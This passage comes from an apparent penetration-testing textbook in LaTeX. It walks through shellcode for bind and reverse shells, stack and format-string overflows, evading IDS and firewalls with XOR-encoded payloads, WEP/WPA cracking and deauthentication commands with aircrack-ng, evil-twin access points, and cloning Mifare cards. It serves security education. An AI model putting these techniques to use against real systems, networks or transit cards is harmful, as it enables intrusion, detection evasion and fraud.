			When setting up browsers for web access, one must decide what needs a secure connection and what can be let connect with the other pages used. 
			This is due to the fact that no matter how good internal sandboxing gets, an attacker could find a way to pivot from one tab to another. 
			This becomes far more difficult when attempting to pivot from one browser to another as the original browser will not know that the second is running. 
			Thus when logging into sites that you deem require security, open a completely different browser and use that to log in. 
		\subsection{Password Management}
			For a long time, this was the domain of the web browser. 
			This allowed the user to forget all of their passwords, having the browser autofil them when the site loaded.
			However, the password managers on modern browsers were not built for security. 
			Thus, the stand alone password manager was created. 
			These allow the user to create a database of passwords and their sites, whilst encrypting the data. 
			When looking for a password manager, look for the following features:
			\begin{itemize}
				\item Open source (the code can be easily audited)
				\item Encrypted Storage. 
				\item End to end encryption if passwords transmitted.
				\item Password generation. 
				\item Trusted by the community. 
			\end{itemize}
			Once the password manager is set up, use it to generate strong passwords for every website you access. 
			This allows you to use a different password for every website, employing characters which one would not be able to remember. 

\chapter{Binary Exploitation}
	\label{ch:BinaryExploitation}
		The execution of a program usually follows a specific set of instructions to the letter. 
		However, mistakes in programming can allow these instructions to be altered or fail. 
		When this occurs, usually the program will crash by some means, stopping execution completely. 
		This is the desired outcome because it ends any vulnerability that the program might have. 
		However, when the environment is carefully controlled, one can use these mistakes to take control of the program, 
		allowing them to execute arbitrary code through the program.\cite{HackingAOE} 
		This is the goal of this section, to craft the environment in such a way that the program can be used to do our bidding. 
	\section{Shellcode}
		Shellcode is the payload that is executed within an exploited program to cause it to act in the way we want.\cite{HackingAOE} 
		This code is often written in Assembly and is written directly into memory to be run by an altered return pointer or some other means of altering execution flow. 
		There are many examples of shellcode available online. 
		These will do most of what you will need, however, knowing how to read and write shellcode will allow you to check that the code you are running will do what you require. 
		Furthermore, if you want to run an exploit which will do a specific task (such as add an admin user), you will likely not find the shellcode you require. 
		Once you understand the creation of shellcode, your exploits are limited only by your destructive insights. 

		Shellcode is written for a specific computer architecture, mainly due to the fact that it is written in assembly.
		A strong grasp of the assembly language syntax for your target computer as well as its configuration will help you to create a working shellcode. 
		Thus, it is recommended that in the scoping and framing section of your attack, you find out as much about the system as you con. 
		Furthermore, a strong grasp of the filesystem and configuration quirks of the target system will allow you to alter the configuration to meet your needs. 
		For the programming concepts that you will need to understand before writing shellcode, read through the assembly section in chapter \ref{ch:ComputerOperations}
		Note that much of the assembly that you will see in this section is not well written for efficiency but rather is written to assemble into the smallest shellcode possible. 
		When writing assembly for other purposes, you should not use actions such as pushing something to the shell and popping it into a register without good reason. 
		\subsection{Data in Shellcode}
			Shellcode can be thought of as a virus, with the program that it is stealing execution from being the biological body. 
			Due to this, shellcode is not a fully fledged program in itself. 
			This means that the shellcode will have to be self contained within its instructions, attempts to use variables in other parts of memory will fail. 
			This is known as position-independent code. 
			Due to this, when one is writing shellcode, they must store any data within the instructions of the program. 
			This, however, raises issues with establishing a pointer to the data, which must be calculated from the instruction pointer. 
		
			To solve this problem, we place the string data directly after a call instruction, causing it to push a pointer to the data onto the stack as the return address. 
			Then, we can jump past the data by using a pop instruction to move its address into a register of our choosing. 
			The following code snippet shows this process:
			\begin{code}
				\lstinputlisting[language={[x86masm]Assembler}]{./ShellcodeData.asm}
				\caption{Getting a Data Pointer in Shellcode}
				\label{code:ShellcodeData}
			\end{code}

			As an exercise, alter this code to print the data is pointed to by RCX. 
			This will be used in the following section for showing a working buffer overflow. 

		\subsection{Writing Shellcode into a Program}
			Often shellcode will be written into a program through means such as environmental variables. 
			However, doing this usually involves C functions such as strcpy, which terminates at the first null byte encountered. 
			The shellcode shown in \ref{code:ShellcodeData} when assembled contains multiple null bytes, such as the string of them after the call instruction.
			These must be removed before the shellcode can be inserted within another program. 
			This call function contains null bytes due to the fact that it is only moving the instruction pointer a small distance. 
			This means that the small number that is placed into the call instructions operands is padded by null bytes. 
			To solve this, we can put the label (``get\_ptr'') above the call command. 
			This will place the twos complement negative number for the jump after the call instruction, removing the null bytes. 
			Further, to get this to work the command ``jmp short one'' must be added to the top and the label ``one'' must be added above ``call get\_ptr''.

			Similarly, null bytes are often found in the operands of other instructions. 
			These can be resolved by only using the needed segments of registers and nulling them out manually by xoring them from themselves. 
			Registers such as RAX are 64 bits long, however, they are made up of EAX (the first 32 bits), AL and AH (The first and last 16 bits of EAX respectively).
			By using these registers, the assembler can condense the code rather than padding it with null bytes. 

			After this, the shellcode should be ready to use. 
			Write it to an environmental variable using the command ``export SHC=\$(cat <assembled shellcode>)''
			%TODO: This is not finished
		\subsection{Popping a Shell}
			Now that most of the difficult concepts have been covered, we will spawn a useable shell using the program we have exploited. 
			This is done through system call 11, ``execve()'' which when given the argument ``/bin/sh'' will pop a shell for you. 
			See man 2 execve for further information on this command. 
			Code example \ref{code:ShellcodePop} is an example of shellcode which uses this method to pop a shell. 
			\begin{code}
				\lstinputlisting[language={[x86masm]Assembler}]{./ShellcodePop.asm}
				\caption{Shellcode to Pop a Shell}
				\label{code:ShellcodePop}
			\end{code}
			The instructions used for formatting the addresses such that they can be used may be confusing at first. 
			See figure \ref{fg:ShellPopMemory}. 
			for a depiction of memory at this time. 
			\begin{figure}[htb]
				\centering
				\begin{tabular}{| l | c | c | c | c | c | c | c | c |}
					\hline
					RAX	& 0x00 	& 0x00	& 0x00	& 0x00	& 0x00	& 0x00	& 0x00	& 0x00 \\ \hline
						& 0x00	& 0x00	& 0x00	& 0x00	& 0x00	& 0x00	& 0x00	& 0x00 \\
					\hline
					\hline
					[RBX] 	& 0x2F & 0x62 & 0x69 & 0x6E & 0x2F & 0x73 & 0x68 & 0x00 \\ \hline
						  & addr & addr & addr & addr & addr & addr & addr & addr \\ \hline
						  & 0x00 & 0x00	& 0x00	& 0x00	& 0x00	& 0x00	& 0x00	& 0x00 \\
					\hline
				\end{tabular}
				\begin{tabular}{| l @{ -> } l |}
					\hline
					RCX & argv string array. [RBX+8] \\ \hline
					RDX & envp pointer array. Null. [RBX + 16] \\
					\hline
				\end{tabular}
				\caption[Depiction of memory after shellcode]{Depiction of Memory After Code Example shellcode pop} %TODO: fix reference
				\label{fg:ShellPopMemory}
			\end{figure}

			Try writing your own version of the shellcode in code example \ref{code:ShellcodePop} and running it against the code in \ref{code:OverflowChallenge}. You should be able to get a shell. 

			\subsection{Attacking Remote Targets}
				The shellcode so far has been useful for attacking a local system only. It cannot communicate with an external computer in order to give that computer access. 
				To have a shell that we can use remotely at the end of the attack, we need to have the shellcode bind a port and listen for our communication over that port. 
				Thus, we will be using the system calls ``socket''\footnote{\url{http://linux.die.net/man/2/socket}}, 
				``bind''\footnote{\url{http://linux.die.net/man/2/bind}}, 
				``listen''\footnote{\url{http://linux.die.net/man/2/listen}} and 
				``accept''\footnote{\url{http://linux.die.net/man/2/accept}} to have the operating system do this for us. 
				However, the use of these system calls requires the creation of a C struct within the shellcode that we write. 
				The shellcode example \ref{code:ShellcodePort}\footnote{\url{https://www.exploit-db.com/exploits/39151/}} shows the creation of a socket connection to another computer. 
				This can then be extended to allow communication through these sockets to a shell spawned by the shellcode in %TODO: ref next code. 
				\begin{code}
					\lstinputlisting[language={[x86masm]Assembler}]{./ShellcodePort.asm}
					\caption{Shellcode to bind a shell to a port}
					\label{code:ShellcodePort}
				\end{code}
				This shellcode on it's own will allow you to check that connection can be established, but will not allow any access to the remote computer. 
				However, this functionality can be added by creating a number of file descriptors for the socket and binding them to the standard input, output and error of the shell. 
				The shellcode in shellcode example \ref{code:ShellcodeSHPort}, when executed after \ref{code:ShellcodePort} will bind a shell to the socket described by the register ``r9''. 
				\begin{code}
					\lstinputlisting[language={[x86masm]Assembler}]{./ShellcodeSHPort.asm}
					\caption{Shellcode to bind a shell to a socket}
					\label{code:ShellcodeSHPort}
				\end{code}
				When these two examples of shellcode are combined and executed, they will create a socket on port 4444 and bind it with the IO of a shell. 
				This will then be accessible to anyone connected to the socket created. 
				When working with remote programs, this is the minimum shellcode required in order to be able to interact with the shell which is spawned. 
				Without this, the program would drop a shell on the system but not be accessible to you. 
				
				The above shellcode, while useful for training, will not work in most situations where a firewall is used. 
				This is due to the fact that most firewalls block incoming connections which were not proceeded by an outgoing connection to the same address. 
				Thus, a better shellcode would attempt itself to connect to the attacker, rather than passively waiting. 
				This will bypass most simple firewall protections. 
				As a challenge, alter the shellcode in example \ref{code:ShellcodePort} to have it conduct a reverse connection. 
				A solution to this can be found in shellcode example \ref{code:ShellcodeReversePort} in the challenges section below. 

			\subsection{RIP Redirection}
			\subsection{Cleaning a Smashed Stack}

	\section{Overflows}
		While newer languages run their own data integrity checks, many program are written in older or faster languages which do not. 
		C and many of it's derivatives do not run these checks, allowing a programmer to make mistakes in memory allocation and buffer writing. 
		While this increases the control given to the programmer and makes for far simpler compilers, it also means that a careless programmer may create vulnerable code. 
		For example, in C, if a program has been told to put 10 bytes into a 2 byte buffer, it will, while in languages such as Java, this will result in an exception. 
		It is this error in memory allocation which is known as the buffer overflow, and which this section will focus on. 

		Programmatically, the most common buffer overflow is when a string or input is copied to another location. This can be seen in %TODO:Ref below table. 
		\begin{code}
			\lstinputlisting[language={[ANSI]C}]{./OverflowSimple.c}
			\caption{Simple Buffer Overflow Example}
			\label{code:OverflowSimple}
		\end{code}
			On reading the above code in \ref{code:OverflowSimple} you should notice the unbounded copy of anything given as the first argument into the second buffer. 
			This means that if you pass more than 8 bytes to the program, it will copy them into second\footnote{This will not work on OS X or a well secured Linux system due to buffer bounds checking}, overwriting anything beyond the its allocated memory. 
			For example:
			\lstinputlisting[numbers=none,firstline=1,lastline=9]{./shellOut/bufOver.out}
			Note that here we altered the content of first by writing to second. 
			This is because each item on the stack is placed at a lower memory location than the item before it. 
			Writing beyond an items bounds will overwrite variables stored in higher memory locations. 
			This can further be seen through the variable changes' hex output, which contains repeated 0x61, the hex value for a. 
			The size and content of the argument will allow you to alter the variables first and change to any arbitrary value.
			However, a longer overflow string may cause the program to crash. 
			See code example \ref{code:OverflowChallenge} in the challenges section of this chapter for another vulnerable code example. 

			Rather than just targeting the variables written into the code, we can also target normal program functions,
			such as the return address of the current stack frame. 
			As discussed in chapter \ref{ch:ComputerOperations}, 
			each function call within a program adds a frame to the stack and each return call follows a pointer back to the instructions that the call was made from. 
			As this pointer lies at the highest memory location in the current stack frame, it is vulnerable to be overwritten through the overflow exploit discussed above. 
			To determine it's location, open GDB on code example \ref{code:OverflowChallenge} and run the command ``dissass main'', which will show you the assembly code of main. 
			\lstinputlisting[numbers=none,firstline=11,lastline=27]{./shellOut/bufOver.out}
		The two bold lines show the return address being calculated and the call to the checkAuth function. %TODO: Add a test to use ShellcodeData.asm 
		\subsection{Heap Based Overflows}
		
	\section{String Format Errors}
		Much like buffer overflows, string format errors can be used to write to memory and eventually redirect the control flow of the program. 
		This vulnerability uses the standard string format codes, seen in table \ref{tab:StringFormatCodes}, which can be inserted into vulnerable inputs. 
		While these formats are useful in programming and not naturally malicious, many, such as the \verb+%n+ and \verb+%x+ codes are exceptionally useful in writing to and mapping memory respectively. 
		Using these, we can write any arbitrary value or memory location into most parts of the stack.
		
		We can achieve this due to the fact that a proper call to printf (or any other function) pushes each of the arguments for the call to the stack in reverse order. 
		The format function will the iterate through these arguments, but rather than counting the number that came in, it will simply count the number of format codes it finds. 
		This means that the function will continue to read from memory, even when no arguments were pushed for it. 
		\subsection{The Vulnerability}
			The string format vulnerability occurs when the printf function is misused with user input strings. 
			Printf should be called using the syntax ``printf("\verb+%s+", string)'', which will not parse the variable ``string'' for format codes. 
			However, occasionally a programmer will call it as ``printf(string)'', at which point printf will parse for and execute all string format codes found within the variable ``string''. 
			When these are picked up, the printf function will look to the next item down the stack, inserting that as it's format parameter. 
			An example of this vulnerability can be seen in code example \ref{code:StringFormatVuln}.
			\begin{code}
				\lstinputlisting[language={[ANSI]C}]{./StringFormatVuln.c}
				\caption{Example of the String Format Vulnerability in Code}
				\label{code:StringFormatVuln}
			\end{code}
			Using this example, attempt to have it write parts of the stack. 
			Try to find items such as return locations and environmental variables. 
			They will be useful later on. 

		\subsection{Writing to Memory Addresses}
			We have been able to read to memory addresses lower on the stack than our print call quite easily. 
			The only thing necessary for this was using \%x statements. 
			However, writing to an arbitrary memory address is more difficult. 

			Printf conveniently provides a method of direct parameter access that can be used to write to a specific location. 
			This is done by specifying ``\%y\$n'' where y is an integer used to specify the number of steps to go down the stack before writing. 
			This will still write the number of bytes which have been printed, giving you an easy way to write arbitrary values to parts of the stack. 
			
			When attempting to write memory addresses into variables or the return pointer on the stack frame, it is best to use two short writes. 
			This can be done using the ``h'' modifier within the ``\%n'' parameter, which will tell it to write only a short (16 bit) value. 
			This means that full 32 bit and 64 bit memory addresses can be written to arbitrary locations within the applications memory, allowing you to control the flow of the program. 

			Using this vulnerability, one can overwrite any memory location within the program. 
			Using thin knowledge, find other memory locations which may be worth overwriting. 
			They can lead to some interesting consequences. 
	\section{Other Common C flaws}
	\section{libc Attacks}
	\section{IDS, IPS and AV}
		These are systems designed to stop you getting into a system or to alert the user and enact a script when an intrusion is detected. 
		While they do make attacks more difficult, none has yet been designed that is perfect. 
		There are a number of methods for avoiding these systems, some of which will be explained here. 

		\subsection{Invisibility}
			When you are attacking a target, you will often be unexpected. 
			This means that you may be able to get into the system without being noticed. 
			Rather than opening with the loudest scan and most powerful attack even though you don't know whether it will get you into the system,
			simply take the time required to run another scan and do a little more research. 
			The extra time will give you the opportunity to enter the system undetected. 
			When you have root access to a system and haven't been detected entering, you are the most powerful and dangerous user of the system. 

		\subsection{Exploiting Without Breaking}
			Another means of becoming invisible is to ensure that the program that you use to exploit does not break immediately when you exploit it. 
			Ensuring that the program doesn't stop will make your attack far less obvious, but is far harder than just running an exploit. 
			This can be done initially by setting up a return address within the shellcode to return execution to the main program. 
			However, while this may work, it will also likely cause the program to crash due to the damage that was done in writing and executing the shellcode in the first place. 
			
			Thus, if you can get a local copy of the program running to test it on, you should run the program through a debugger, checking for the memory that you have likely overwritten and repairing it. 
			This is usually done by adding a breakpoint instruction within your Shellcode (such as the ``int3'' instruction) and then running it on the target program within GDB. 
			When viewing this, the damage that you have done should be obvious, and thus can be repaired within your shellcode. 

			Further to this, you will also have to ensure that the process that you are targeting doesn't have a distinct pause while your shellcode is running. 
			This means that your shellcode should fork into another thread or process as soon as possible. 
			This can be done using the fork system call then having the parent clean up and return to the main process. 
			In order to do this, one must remember that the fork system call will return 0 in the child process, but the new PID in the parent. 
			This can be used to make the parent (non-zero return) conduct the clean up while the child continues to process your shellcode goals. 
			\begin{code}
				\lstinputlisting[language={[x86masm]Assembler}]{./forkShellcode.asm}
				\caption{Shellcode that forks such that the original thread can continue. }
				\label{code:ForkShellCode}
			\end{code}

		\subsection{Firewalls}
			This is another aspect that must be thought about. 
			Even a simple firewall will often block a number of suspicious ports, such as 31337 which has historically been used for malicious purposes. 
			However, a more complex firewall will have rules stating that a normally inbound serving service such as a webserver should not be able to create an outgoing connection. 
			Thus, you will have to determine what is going on with the firewall on the system you are targeting and work around its rules. 

			One way to do this is to reuse sockets within the program. 
			This has the added bonus of not logging anything extra as no new socket is created. 
			However, it also means that the firewall has already allowed the connection to be created, meaning that the shell will not be caught within its rules. 
			Remembering that when we exploit a program, out exploited version will still have total access to the memory of the original, even if we have forked it to create a new process. 
			Thus, we can take the file descriptor which was used to communicate and bind it to our shell. 
			This is done by debugging the target program and finding the address of the socket that we would like to use, then loading that address and using it in our bind calls. 

		\subsection{Payload Smuggling}
			Many IDS or IPS systems will scan the contents of the packets that are being sent over the network. 
			This will stop most of the shellcode that we have been creating in this chapter, as the goal of the code is quite obvious. 
			However, this can be stopped using a method known as payload smuggling, which will obfuscate the payload to the point that the casual reader or fast acting IDS would not notice it. 

			The easiest way to do this is to encode parts of the shellcode. 
			The most obvious of these is strings such as ``/bin/bash'', which will be picked up by even the most basic IDS. 
			However, after running these through a XOR function, we have simple binary data which will not be picked up by the IDS. 
			So long as we retain the key this data can be returned to it's original form and used within the program. 

			A further attempt at this within a highly secure environment is to use this XOR function on the whole shellcode, leaving only a decoder and loader in memory. 
			While this is far more complex, it means that no statically scanning IDS will be able to detect your shellcode unless you are using a known key. 

			Further to this, the NOP sleds that are commonly used within shellcode are quite obvious to an IDS as they are rarely if ever used in the normal world. 
			However, table \ref{tab:NOPAlternatives} shows a list of instructions, their hex values and their ASCII interpretations that can be used instead. 
			\begin{table}[htb]
				\centering
				\begin{adjustbox}{max width=1\textwidth}
				\begin{tabular}{| l | c | l |}
					\hline
					\textbf{Instruction} & \textbf{Hex} & \textbf{ASCII} \\ \hline
					inc eax	& 0x40 & @ \\ \hline
					inc ebx & 0x43 & C \\ \hline
					inc ecx & 0x41 & A \\ \hline
					inc edx & 0x42 & B \\ \hline
					dec eax & 0x48 & H \\ \hline
					dec ebx & 0x4B & K \\ \hline
					dec ecx & 0x49 & I \\ \hline
					dec edx & 0x4A & J \\ \hline
				\end{tabular}
			\end{adjustbox}
				\caption{NOP Sled alternatives}
				\label{tab:NOPAlternatives}
			\end{table}
			As the registers need to be zeroed out before use anyway, it is fine to use these instructions rather than creating a NOP sled as they will be executed before the shellcode starts processing.  

		\subsection{Other Mitigations}
			These are further mitigations that require further study. 
			Each of them has a weakness, but these weakness are beyond the scope of this document. 
			Where the weakness is well known, its name will be given alongside that of the mitigation. 

			Stack Hardening is the walling off of the stack from executable memory. 
			This means that any inserted shellcode stored within stack based memory will not be executable as the OS will know that it was never supposed to be run. 
			This is implemented in Linux through the Grsecurity and PaX patch sets, which when set up properly will completely block stack execution. 
			However, this can be overcome using the ``return to libc'' method.

			Randomized stack space is another mitigation that makes exploits harder. 
			This mitigation disrupts the convenient stack layout that we have used to our advantage within this chapter, randomizing it such that one cannot know where a variable will occur. 
			Since Linux version 2.6.12 this has been enabled by default, making the execution of shellcode which has been written onto the stack a matter of luck. 
			This can be overcome, but requires that you brute force the return address before being able to write shellcode which will work with it. 


	\section{Challenges}
		The shellcode found in \ref{code:ShellcodeReversePort} is the solution to the reverse TCP connection problem given in Attacking Remote Targets. 
		\begin{code}
			\lstinputlisting[language={[x86masm]Assembler}]{./ShellcodeReversePort.asm}
			\caption{Reverse socket connection shellcode challenge}
			\label{code:ShellcodeReversePort}
		\end{code}
		\newpage
		The overflow challenge found in code example \ref{code:OverflowChallenge} is another simple stack based overflow vulnerability. 
		Try to set the password to 0xDEADBEEF to login.
		This code should also be vulnerable to the introduction of shellcode to the return address of the stack frame. 
		\begin{code}
			\lstinputlisting[language={[ANSI]C}]{./OverflowChallenge.c}
			\caption{Overflow Challenge}
			\label{code:OverflowChallenge}
		\end{code}
\chapter{Wireless Attacks}
	\label{ch:WirelessAttacks}
	Wireless networks are great. 
	They allow us to connect to networks without having to carry around huge Ethernet cables everywhere we go. 
	They allow mobile phones, smart watches and laptops with only one port. 
	However, all of these wireless protocols have one thing in common, they all broadcast data over a spectrum readable by anyone. 
	This means that unlike wired networks---where a cable or device must be altered to read the transmission---wireless networks can be intercepted by anyone within range. 
	
	This has been mitigated by the use of encryption and specially designed protocols which attempt to ensure data integrity, but it is far from perfect. 
	Sometimes, like with WiFi, the high level of security provided by WPA2 will be compromised in the name of convenience by vendors through means such as WPS.
	Other times, such as with bluetooth, the standard will have to support low powered devices, which cannot handle the requirements of the normal encrypted stream. 
	And in the case of many of these technologies, it is usually cheaper to release old hardware, such as Mifare classic NFC cards, which have a known vulnerable random number generator backing their encryption. 
	In these cases and many more, we can exploit these failures, allowing us to connect to and read from these networks and devices, using them for our purposes. 
	\section{Aircrack-ng}
		Aircrack-ng\footnote{\url{http://aircrack-ng.org/doku.php?id=newbie\_guide}} is a suite of tools which can be used to attack WiFi networks. 
		These tools allow you to place hardware in monitor modes and intercept the required packets in order to collect hashes and crack access codes. 
		Each tool is used for a different goal, but many of them will need to be used for a complete attack. 
		\subsection{WiFi Basics}
			Before attacking a WiFi network, you will need to understand how they work. 
			This understanding will make the next few sections make sense, rather than being learned by rote.

			WiFi Beacons are a transmission sent out by an access point (AP) at a rate of 10 per second. 
			These contain information about the network such as:
			\begin{itemize}
				\item The name of the network (ESSID)
				\item If and what encryption is used, though this may not always be accurate. 
				\item the supported data rates. 
				\item the channel the network is broadcasting on. 
			\end{itemize}
			This information can be seen using commands such as ``iwlist'' or ``airodump-ng''.
			Furthermore, in the output of these two programs, you will see a MAC address for the AP. 
			This address will be how we will refer to the AP in future commands. 
			Furthermore, in the following sections, you will see the device ``wlan0'', this is used as a generic WiFi device. 
			Change it to the one reported by ``iwconfig'' on your system. 
		\subsection{Sniffing a Network}
			The first step to a wireless attack is to gather data about the potential target. 
			This phase uses the tools ``airmon-ng'' and ``airodump-ng'' as a means of setting up the hardware and gathering information about nearby networks. 
			To set the hardware properly, we must shift the WiFi card into monitor mode:
			\begin{lstlisting}[style=CLI]
				$ airmon-ng start wlan0
			\end{lstlisting}
			At this point, you will want to run ``iwconfig'' to check how your device driver handles monitor mode, you may find a new device called ``wlan0mon'' which you should use in the next few commands. 
			Within this output, you should also see that your device has been put into monitor mode. 
			For the purposes of this section, I will continue to refer to the WiFi device as ``wlan0'' even in monitor mode. 

			We can now start searching for and gathering information about nearby networks. 
			\begin{lstlisting}[style=CLI]
				$ airodump-ng wlan0
			\end{lstlisting}
			This will show you an output of all details listed in the above section for each AP within range, with further information about its power and the number of intercepted beacons. 
			Furthermore, you will see information about the clients which are connected to nearby APs in the lower block of the output. 
			%TODO: Program output would be nice. 
			When selecting a target network, you should ensure that it has a number of clients connected and has a high signal strength. 
			For your first attack, it is best to attempt on a WEP encrypted network. 
			Though rare, these networks are still seen, and are exceptionally easy to attack, making them a good first step. 

			At this point, we move to targeting just the network that we are attempting to access. 
			To do this, the ``airodump-ng'' command is used in a more refined manner to create a dump of initialization vectors (IV) which are transmitted between the network and its clients. 
			\begin{lstlisting}[style=CLI]
				$ airodump-ng -c <channel> --bssid <AP MAC> -w dump wlan0
			\end{lstlisting}
			Substituting the ``<channel>'' and ``<AP MAC>'' for the relevant information. 
			This will give you a dump of the IVs which were sent across the network, which can be used to crack the password of a WEP network. 
			You will need to wait until between 40000 and 85000 IVs have been collected, which may take some time depending on the network traffic at the time. 
			
			Once this has been collected, the key can be cracked using ``aircrack-ng''.
			\begin{lstlisting}[style=CLI]
				$ aircrack-ng -b <AP MAC> dump-01.cap
			\end{lstlisting}
			This will run an offline attack against the IVs collected in the .cap file.
			This may take a long time, depending on the number and strength of the IVs that were collected.
			If you have followed this correctly to this point, you should have the network password at the end of the processing of the above command. 
		\subsection{Active Attacks}
			Often and especially when attacking networks secured with WPA and WPA2, just collecting IVs and running an offline attack will be ineffective. 
			Thus, we use our own hardware to inject frames which alter the network to allow us to gather more information. 
			Such attacks still use the same end method of collecting IVs and cracking them with aircrack-ng, but in this case, the process will be far faster due to our manipulation. 

			Packet injection does not work on most WiFi cards\footnote{\url{http://aircrack-ng.org/doku.php?id=compatibility\_drivers}}
			however, when it does work, it allows for a far more powerful attacks. 
			To ensure that injection is supported by your device, check whether authentication is successful with the following command:
			\begin{lstlisting}[style=CLI]
				$ aireplay-ng --fakeauth 0 -e <Network Name> -a <AP MAC> wlan0
			\end{lstlisting}

			At this point we can begin to speed up IV collection using ARP-request reinjection. 
			This works by capturing ARP request packets (used to translate from an IP address to a MAC address) and resending them. 
			However, this has been blocked as of WPA, making it useful only for WEP networks.
			The simple method for this uses the following command:
			\begin{lstlisting}[style=CLI]
				$ aireplay-ng --arpreplay -b <AP MAC> -h <Client MAC> wlan0
			\end{lstlisting}
			At this point you will have to wait until an ARP packet is received, collecting IVs in another terminal. 
			When the ARP packet is received, aireplay-ng will repeat it back at the AP continuously, causing the traffic on the network to increase, thus collecting more IVs. 
			However, aireplay-ng can send too many ARP packets, causing IV collection to stall. 
			If this occurs, use the ``-x'' option starting at 50 and working down until IVs collect in a steady stream again. 

			The more aggressive way to run this attack is to force the client off the network, making it re-authenticate and refresh its ARP cache. 
			This also means that you can sniff the ESSID and possibly a keystream when the computer reconnects with the AP, allowing for a wider range of attacks. 
			To run this attack, run the following command while running an ARP replay and collecting IVs:
			\begin{lstlisting}[style=CLI]
				$ aireplay-ng --deauth 5 -a <AP MAC> -c <Client MAC> wlan0
			\end{lstlisting}
			This makes ARP replay and IV collection far faster.
			However, your attack also becomes far more obvious on the network, making it more likely that a attentive user or IDS will notice your attack. 
			The method used in cracking WEP using IVs contains interesting mathematical and logical concepts. 
			I recommend reading the Wireless section of Jon Erickson's ``Hacking, the Art of Exploitation''\cite{HackingAOE} for more information.
			
		\subsection{WPA and WPA2}
			The above sections have discussed the old technology used for attempting to secure wireless networks. 
			Modern networks will usually use WPA2, which when coupled with a strong pre-shared key is far more difficult to attack. 
			This is due to the fact that data such as IVs cannot be used to make the attack faster, with the only transmission of useful data being the initial handshake between client and AP. 
			Due to this, a brute force or dictionary attack are the most common attacks on WPA2 networks. 

			The first step of this attack is to capture the connection handshake between a client and AP. 
			This can be done first by setting your card into monitor mode, then by setting airodump-ng to collect traffic. 
			Both of these commands are the same as the WEP attack above. 
			At this point you are waiting for a new client to connect to the AP, however, rather than waiting, you can use the deauth aireplay command above to have this happen quicker. 

			When you have successfully collected a handshake, you will be able to start a dictionary attack on it. 
			The most simple method of this is to use the following command:
			\begin{lstlisting}[style=CLI]
				$ aircrack-ng -w <password list> -b <AP MAC> <capture file>
			\end{lstlisting}
			If a valid handshake is found, you will be informed that aircrack-ng is attempting to crack it. 

			The dictionary is the most important part of this attack. 
			Without it, the attack would take a prohibitive amount of time. 
			However, programs such as ``John the Riper'' can be used to generate a far better dictionary than the one given by aircrack-ng and even the ``rockyou'' word-list given by kali. 
			Furthermore, if you are willing to store large amounts of data and use a custom program, rainbow tables could speed this process significantly for common passwords. 
			If neither of the above work, the final option is to use a program such as ``hashcat'', which will allow you to undertake GPU accelerated cracking on multiple machines in order to find the password. 
			See the Hash Cracking section of chapter \ref{ch:Cryptography} for more detailed information about this. 
	\section{Other WiFi Attacks}
		Outside of attempting to crack passwords, there are a number of other means for gaining access to a system through WiFi. 
		This can be done in a number of ways, such as spoofing a network or breaking a RADIUS server. 
		\subsection{Spoofing a WiFi Network}
			This is the act of creating a network with the same name as the one you are targeting and waiting for people to join it. 
			This works because of the fact that most devices store past networks and actively attempt to connect to the strongest signal. 
			Due to this, a device will often connect to an open network with no notice to the user, allowing you to intercept all traffic. 

			The main example of this currently is the WiFi Pineapple. 
			This device waits for incoming requests for networks and responds with the requested name. 
			Each time a device beacons out attempting to connect, it will broadcast the names of all the networks it knows. 
			The WiFi Pineapple will then respond saying that it is one of the known networks, having the device connect to it. 
			Once connected, the WiFi Pineapple will connect the target through to the Internet, making the connection seem seamless. 
			However, the owner of the Pineapple will be able to read all traffic which is being sent through the device. 

			While this is not a common attack, it is difficult to protect against. 
			There are a number of open access points purporting to offer ``Free WiFi'', however, none can be trusted. 
			This is because they are all on hardware which is not known and could be intercepting traffic. 
			Furthermore, if you do connect to these, someone with a WiFi Pineapple or similar device could intercept your connection and intentionally steal your data. 

			Due to these issues, there are only two ways to combat this attack:
			\begin{itemize}
				\item Do not connect to open WiFi Access Points
				\item Turn WiFi off when not in use. 
			\end{itemize}

			This attack only works due to the WiFi authentication protocol not requiring that the AP authenticate with the user. 
			Thus, any AP can purport to be any other, and the user and their device will be none the wiser. 
	\section{Bluetooth}
	\section{Near Field Communications}
		NFC cards and tags are an exceptionally useful input device for many solutions. 
		The can be used to input data which is often assumed to be valid due to the fact that it is stored on a card which the user is not supposed to be able to read or write. 
		This is the factor that we use to exploit, these cards will often contain references to locations or monetary values which we can alter to change the usage of the card. 
		Furthermore, if we can get access to one of these cards, we can clone it, possibly giving us access to all areas that the original card owner had. 
		In this section, we will focus on the Mifare classic card. 
		This card has a well known vulnerability with multiple tools written for it, but is still commonly used for minor payments such as in public transport. 
		\subsection{Card dumps}
			The first step in any attack on Mifare classic cards is to get a full dump of the cards data and keys. 
			This will allow us to edit the data as shown below, but it will also allow us to clone the card. 
			In order to do this, the tool ``mfoc'' is used. 
			\begin{lstlisting}[style=CLI]
				$ mfoc -O out.mfd
			\end{lstlisting}
			This should output a dump of the card, which we will edit in the next section. 
			However, this doesn't always go as planned. 
			If you get an error, it is likely that the VM or card reading hardware that you are using is not up to the task of creating card dumps. 
			If this is the case, look into using an installed version of Kali and getting a NFC reader based on the ACR112U chipset. 
		\subsection{Editing Dumps}
		\subsection{Writing cards}
			Once you have edited the card dump, or in order to clone a card, you will want to write the dump to a card. 
			This process is easy given the correct card or the original. 
			However, without this, the UID of the card cannot be altered, making it easy to detect the fact that the card is a forgery. 
			When looking for blank cards, check that block 0 is unlocked, as this is the UID block that is required to create a true copy. 

			To write a card, use the following command:
			\begin{lstlisting}[style=CLI]
				$ nfc-mfclasic w B <dump.mfc> <dump.mfc> 
			\end{lstlisting}
			If you have a to which the UID can be overwritten, change the ``w'' to ``W'' and the program will attempt to overwrite the UID. 
			At this point, you should have written the whole dump to the card, allowing you to use it in place of the original. 
			However, if you would like to test this, create another dump of the new card and run both dumps through a tool such as ``vbindiff'' which will check for differences between the hex of the two dumps. 
			If you see a difference on the 0 line, it is likely due to the card not having a write enabled 0 block. 
			Any other differences mean that the write was unsuccessful, and should be attempted again. 
	\section{Challenges}
\chapter{Reporting}
	\label{ch:Reporting}
	\section{Report Writing}
		While far from being the most glamerous or interesting part, writing the report is one of the most important parts of a penetration test\cite{playbook}. 
		It is the part of the test that will ensure vulnerabilities are removed and your work will continue. 
		Furthermore, it is a statement of your own skill in expressing what you did and how it effects the network being attacked.

		The easy solution here is to simply repackage the vulnerability scans tat were conducted. 
		This will give a report listing potential vulnerabilities in the network and their potential serverity. 
		However, this tells the reader nothing about the data that could be accessed through the vulnerabilities, 
		nor anything about the process and difficulty of exploiting them. 
		Thus, such a report seems cheap and useless to the customer, making them less likely to implement anything you advise. 

